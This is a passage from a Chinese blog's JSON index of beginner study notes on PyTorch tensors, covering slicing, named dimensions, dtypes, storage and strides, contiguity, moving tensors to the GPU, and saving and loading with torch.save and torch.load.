1]输出tensor(1.)#返回第0个点的y坐标，可以理解为二维数组访问元素的方法\n\n索引张量如果我们需要得到张量中除了第一个点之外的所有点，我们九十一使用列表中的切片，如在列表中\nsome_list = list(range(6)) some_list[:] #全部切片some_list[1:4] #第二个到第三个some_list[1:] #第二个以后some_list[:4] #第一个到第三个some_list[::1] #所有元素some_list[1:4:2]#第二个到第三个，步长为2\n\n在张量中，可以使用相同的表示法，在每一个维度都可以使用范围索引\npoints[1:] #第一行后的所有行，包含所有列points[1:, :] #第一行后的所有行，所有列points[1:, 0] #第一行后的所有行，第一列points[None]#增加大小为1的维度\n\n命名张量张量的维度或者是坐标轴通常用来表示诸如像素位置或者是颜色通道的信息，当我们需要将一个张量作为索引的时候，我们需要记住维度的顺序并以此顺序些索引\n假设有一个img_t的三维向量，为了简单，使用虚拟数据，将其转换为灰度图像，\nimg_t = torch.randn(3, 5, 5) # shape [channels, rows, columns] weights = torch.tensor([0.2126, 0.7152, 0.0722])\n\n如果希望代码具有通用性，从表示为具有高度和宽度的二维张量的灰度图像到添加第三个通道的彩色图像，或者从单幅图像到一批图像，假设增加的维度是2：\nbatch_t = torch.randn(2, 3, 5, 5) # shape [batch, channels, rows, columns]\n\nrgb通道有时候在第0维，有时在第一维，我们可以通过从末端开始计数来归纳，总是在从末端开始的第三维中，因此惰性的未加权平均值可以写成下面的形式：\nimg_gray_naive = img_t.mean(-3) batch_gray_naive = batch_t.mean(-3) img_gray_naive.shape, batch_gray_naive.shape 解释- 代码功能 ：- img_t.mean(-3) 和 batch_t.mean(-3) 都是沿着通道维度（第-3维）计算平均值- 这种计算方式被称为&quot;惰性&quot;或&quot;未加权&quot;灰度转换，因为它简单地对RGB通道取均值- 维度解释 ：- 对于单张图像 img_t (形状为 [C,H,W])：  - -3 表示通道维度（通常是第0维）  - 计算后会得到形状为 [H,W] 的灰度图- 对于批量图像 batch_t (形状为 [N,C,H,W])：  - -3 仍然是通道维度（第1维）  - 计算后会得到形状为 [N,H,W] 的批量灰度图    灰度图：灰度图（Grayscale Image）是指仅包含亮度信息而不包含颜色信息的图像\n\npytorch允许我们对相同形状的张量进行乘法运算，也允许与给定维度中其中一个操作数大小为1的张量进行计算，他还会自动附加大小为1 的前导维度，这个特性别称之为广播\n当创建和使用张量的位置在很远的时候，就很容易出现错误，可以给维度指定一个名称，\nweights_named = torch.tensor([0.2126, 0.7152, 0.0722], names=[&#x27;channels&#x27;]) weights_named输出tensor([0.2126, 0.7152, 0.0722], names=(&#x27;channels&#x27;,))\n\n当我们已经有一个张量并且想要为其添加名称但不改变现有的名称时，我们可以对其调用refine_names()方法。与索引类似，省略号（…）允许你省略任意数量的维度。使用rename()兄弟方法，还可以覆盖或删除（通过传入None）现有名称：\nimg_named = img_t.refine_names(..., &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) batch_named = batch_t.refine_names(..., &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) print(&quot;img named:&quot;, img_named.shape, img_named.names) print(&quot;batch named:&quot;, batch_named.shape, batch_named.names) img named: torch.Size([3, 5, 5]) (&#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) batch named: torch.Size([2, 3, 5, 5]) (None, &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) \n\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-4day","url":"/2025/04/16/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-4day/","content":"张量的元素类型到目前为止，已熟知张量的基本知识，但是还没有不晓得可以在张量中储存什么类型，数据科学库依赖于numpy或引入专用的数据结构，如pytorch张量，提供数字类型的数据的有效底层实现和相关操作，并将这些封装在一个方便的高级api中，要实现这一点，张量中的对象必须是相同类型的数字，pytorch必须跟踪这个数字类型\n使用dtype指定数字类型张量构造函数通过dtype参数指定包含在张量中的数字的数据类型，如tensor和zeros和ones函数，数据 类型用于指定张量可以保存的可能值，dtype参数类似于同名的标准numpy参数\n  torch.float32或torch.float：32位浮点数。  torch.float64或torch.double：64位双精度浮点数。  torch.float16或torch.half：16位半精度浮点数。  torch.int8：8位有符号整数。  torch.uint8：8位无符号整数。  torch.int16或torch.short：16位有符号整数。  torch.int32或torch.int：32位有符号整数。  torch.int64或torch.long：64位有符号整数。  torch.bool：布尔型。张量的默认数据类型是32位浮点数。用法# 创建float32类型张量（默认）a = torch.ones(3, dtype=torch.float32)# 创建float64（双精度）张量b = torch.randn(6, dtype=torch.float64)# 创建int32类型张量c = torch.zeros(4, dtype=torch.int32)\n\n管理张量的dtype属性为了给张量分配一个正确的数字类型，我们可以指定适当的dtype作为构造函数的参数，如：\na = torch.ones(3, dtype=torch.float32)\n\n可以通过访问相对应的属性dtype来访问一个张量的类型\n还可以使用相对应的转换方法将张量创建函数的输出转化为正确的类型，\ndouble_points = torch.zeros(10, 2).double() short_points = torch.ones(10, 2).short()或者使用更方便的方法：double_points = torch.zeros(10, 2).to(torch.double) short_points = torch.ones(10, 2).to(dtype=torch.short)\n\n在操作中输入多种类型的时候，输入会自动向较大类型转换，因此，如果我们想要进行32位计算，我们需要确保所有的输入都是32位的\npoints_64 = torch.rand(5, dtype=torch.double) points_short = points_64.to(torch.short) points_64 * points_short tensor([0., 0., 0., 0., 0.], dtype=torch.float64)\n\n张量的api到此，了解了什么是张量，以及他们在底层是如何工作的，关于张量以及张量种的绝大多数操作都可以在torch模块种找到，如transpose函数\n在PyTorch中，张量(Tensor)的API是指所有可以对张量进行操作和变换的方法和属性的集合。\n\n对张量操作按组进行划分\n创建操作—用于构造张量的函数，如ones()和from_numpy()。索引、切片、连接、转换操作—用于改变张量的形状、步长或内容的函数，如transpose()。数学操作—通过运算操作张量内容的函数：\t● 逐点操作—通过对每个元素分别应用一个函数来得到一个新的张量，如abs()和\t\tcos()；\t● 归约操作—通过迭代张量来计算聚合值的函数，如mean()、std()和norm()；\t● 比较操作—在张量上计算数字谓词的函数，如equal()和max()；\t● 频谱操作—在频域中进行变换和操作的函数；\t● 其他操作—作用于向量的特定函数（如cross()），或对矩阵进行操作的函数（如\ttrace()）；\t●  BLAS和LAPACK操作—符合基本线性代数子程序（Basic Linear Algebra Subprogram，BLAS）规范的函数，用于标量、向量—向量、矩阵—向量和矩阵—矩阵操作。随机采样—从概率分布中随机生成值的函数，如randn()和normal()。序列化—保存和加载张量的函数，如load()和save()。并行化—用于控制并行CPU执行的线程数的函数，如set_num_threads()。\n\n","tags":["深度学习"]},{"title":"深度学习-5day","url":"/2025/04/17/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-5day/","content":"张量的存储视图在底层代码种，张量中的被分配到由torch.storage实例所管理的连续内存块当中，存储区是由数字数据所组成的一维数组，即包含给定类型的数字的连续内存块，如下图所示\n----------------|   张量(引用相同的储存区)   |-----------------|| 4 | 1 | 5 |                              |  4  |  1  || 3 | 2 | 1 |                              |  5  |  3  |从0开始，2行3列                             |  2  |  1  |                                           从0开始，3行2列存储区| 4 | 1 | 5 | 3 | 2 | 1 |.................                    张量是storage实例视图                       \n\n索引储存区在实际中如何使用二位点来索引储存区，可以使用storage()访问给定张量的存储区：\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) points.storage() 输出&lt;bound method Tensor.storage of tensor([[1., 2.],        [2., 3.],        [3., 4.]])&gt;\n\n在底层中，事实上储存的是一个连续的大小为6的连续数组，但是在你打印的时候是会自动进行还原的，我们可以手动索引储存区\na = torch.tensor([[1,2],[2,3],[3,4]],dtype=torch.float32)b = a.storage()print(b[0])输出1.0\n\n不能使用两个索引来索引二维张量的存储区，不管和存储区相关的任何其他张量的维度是多少，他的布局始终都是一维，也可以通过索引直接改变存储区的值\n张量元数据为了在存储区中建立索引，张量依赖于一些明确定义他们的信息，大小，偏移量和步长，大小，在numpy中又被称之为形状是一个元组，表示张量在每一个维度上有多少元素，偏移量就是指存储区中某元素相对第一个元素的索引，步长是指存储区中为了获得下一个元素需要跳过的元素的数量\n\n另一个张量的存储视图我们可以通过提供相应的索引来得到张量中的第二个点，\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1] second_point.storage_offset()//返回相对第一个元素的位置的偏移量\n\n函数size和shape属性所包含的信息是一致的\nsecond_point.shapetorch.Size([2]) \n\n步长是一个元素，知识当索引在每一个维度增加1的时候在存储区中必须要跳过的元素的数量，\n例如points的步长为（2，1），意思就是- 第一个数字 2 ：表示在第0维（行）上移动一格时，需要在底层存储中跳过2个元素。- 第二个数字 1 ：表示在第1维（列）上移动一格时，需要跳过1个元素。\n\n使用stride方法就可以获取到步长\n当我们索引一个特定的点，同时看到偏移量增加，表名我们已经提取了一个子张量\nsecond_point = points[1] second_point.size()输出torch.Size([2])second_point.storage_offset()#输出2second_point.stride()输出(1,)\n\n正如预期的那样，子张量的维度少了一维，但仍然能索引到与原始张量相同的存储区，更改子张量也会对原始张量产生影响\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1] second_point[0] = 10.0 points 输出tensor([[ 4., 1.],         \t\t[10., 3.],         \t\t[ 2., 1.]])\n\n可以使用clone方法将这个子张量复制成一个新的张量\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1].clone() second_point[0] = 10.0 points 输出tensor([[4., 1.],        \t[5., 3.],         \t[2., 1.]]\n\n无复制转置使用张量points，它在行中有单独的点，在列中有x和y的坐标，然后将其转置，使各个点都在列中，使用t()方法，用于转置一个矩阵\n并且这样转置出来的矩阵和原矩阵共用一个存储区\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1].clone() print(points.t())输出tensor([[4., 5., 2.],        [1., 3., 1.]])        可以验证这两个张量共享一个存储区id(points.storage()) == id(points_t.storage())输出true\n\n只是在形状和步长上有所不同\n将张量转置之后，如下图所示，我们在步长中改变元素顺序之后，增加的行将沿着存储区跳跃一个单位，就像沿着原张量的列移动一样，转置不会分配新的内存只是创建一个tensor的实例\n\n连续张量在pytorch中一些张量操作只对连续的张量起作用，使用contifuous方法可以将一个不连续的张量转换成一个连续的张量，但是步长和存储发生了改变\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) 、points_t = points.t() #转置points_t 输出tensor([[4., 5., 2.],         \t[1., 3., 1.]])\tpoints_t.storage()输出4.0   1.0   5.0   3.0   2.0   1.0#存储区域points_t.stride()#计算步长输出(1,2)points_t_cont = points_t_cont.contiguous()#转换points_t_cont输出tensor([[4., 5., 2.],         \t\t[1., 3., 1.]])#可以看到已经发生了转置\t\tpoints_t_cont.stride()#计算步长输出(3,1)#可以看到步长已经发生了改变points_t_cont.storage()输出4.0   5.0   2.0   1.0   3.0   1.0#存储区也发生了变化 \n\n将张量存储到Gpupytorch最重要的能够大幅提升运行速度的特性就是可以在gpu上和cpu上同时与逆行，以大规模的提升运算速度\n管理张量的设备属性\npytorch张量还有device的概念，就是张量数据在计算机上的位置\npoints_gpu = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]], device='cuda')\n\n可以使用to方法将在cpu上创建的张量复制到gpu上：\npoints_gpu = points.to(device='cuda')\n\n这样将会返回一个新的张量\n序列化张量创建动态的张量是很好的，但是如果里面的数据是有价值的，我们希望将其保存到一个文件当中，可以免去每次运行程序的时候都要从头开始对模型进行训练，可以使用pickle来序列化张量对象，并为存储添加专用的序列化代码，\ntorch.save(points, '../data/p1ch3/ourpoints.t')\n\n加载张量同样可以通过一行代码来实现\npoints = torch.load('../data/p1ch3/ourpoints.t')\n\n用这种方法可以快速的保存张量和使用张量\n","tags":["深度学习"]}]